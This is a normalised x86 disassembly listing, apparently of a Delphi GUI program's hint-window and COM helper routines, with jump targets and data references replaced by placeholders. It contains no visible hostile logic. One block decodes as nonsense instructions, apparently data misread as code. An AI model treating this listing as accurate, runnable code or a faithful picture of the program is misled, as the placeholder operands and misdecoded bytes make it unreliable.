mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_47628c
pop ecx
jmp r-xdata
mov eax ebx
call sub_45c684
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_45c380
push eax
call IsChild
test eax eax
jne r-xdata
sub_476370
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058a0
call sub_42d7e8
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_476398
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_4763dc
push sub_4740c8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_476590
sub_476404
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406c9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_455564
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_4542f8
call sub_4740a8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_476590
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406c9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_455564
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_476590
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_476398
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_456c00
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_476828
jmp r-xdata
sub_476514
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4763dc
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_476828
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_47654c
jmp r-xdata
sub_47654c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_45c380
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_45c380
push eax
call ShowWindow
sub_476590
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_47654c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_474230
mov eax ebx
call sub_4763dc
sub_4765c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_47670a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_4269d8
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e1c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4766db
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_426a90
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4766e2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_4765b8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_4765b8
mov [ ebp - 0x4 ] eax
sub_4766e2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_47671c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4031ec
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403134
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_47677c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_476816
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47681d
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40406c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_425598
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c738
mov ebx eax
inc ebx
sub_476828
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048e8
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_476bae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_476590
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_476398
jmp r-xdata
call sub_46ca44
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476bb5
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_4542f8
call sub_4740a8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_4765c8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_47346c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4553ec
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_455590
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_474070
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_452b18
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404014
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_456c00
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_47671c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_4033e8
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_455564
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_455564
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_455bec
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_4741bc
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_47677c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_476398
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_476398
jmp r-xdata
sub_476bbc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fd0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fd0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_476c1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_476c48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_456c00
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_456c00
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_46227c
sub_476cd8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_476d00
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_476da4
add [ eax ] eax
add [ eax ] al
cmovs eax [ fs : eax ]
xor [ esi ] bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_476e07
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476e0e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_46c7f0
mov eax sub_46ca70
call sub_41876c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_477020
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403fd0
mov eax [ ebx ]
call sub_4087b8
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_40423c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_40443c
mov edx esi
sub edx eax
mov eax ebx
call sub_4045c8
mov eax [ ebx ]
call sub_4087b8
mov esi eax
sub al 0xd
je r-xdata
sub_477070
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_477117
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404014
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40bc98
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47711e
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fa0
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b2f8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_409084
sub_47711e
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_477140
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4771b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_477020
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_477070
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_403fd0
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4771b9
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
add esp 0xfffffff0
call sub_403550
sub_4771b9
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_47720c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_4771f4
mov eax esi
mov edx [ esp ]
call sub_4041a4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_477238
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_4771f4
mov eax esi
mov edx [ esp ]
call sub_4041a4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_477264
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4058a0
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_4771f4
pop esi
pop ebx
retn
sub_47729c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4048e8
xor eax eax
push ebp
push sub_4773e0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402bf8
mov eax ebx
call sub_4047b8
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_4058a0
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4047c8
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_404204
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_4041ec
mov eax [ ebp - 0x48 ]
pop edx
call sub_40804c
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_4771f4
mov eax [ ebp - 0x8 ]
call sub_4771f4
mov eax edi
mov edx [ ebp - 0xc ]
call sub_4058b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4773e7
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
mov ebx 0x15
jmp r-xdata
sub_477400
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47748c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_415df0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477493
lea eax [ ebp - 0xc ]
call sub_4058a0
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
lea eax [ ebp - 0xc ]
call sub_4058a0
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_415df0
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_4774ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_47753e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477545
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
lea eax [ ebp - 0x4 ]
call sub_4058a0
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_415df0
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_415df0
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_415df0
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_47755c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_47765e
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477750
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_4058a0
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404204
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_404204
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404204
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477140
jmp sub_4039b8
lea eax [ ebp - 0x8 ]
call sub_40465c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_40465c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40465c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_477720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477757
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fa0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404674
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_477760
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4048e8
xor eax eax
push ebp
push sub_477a93
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_477a70
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
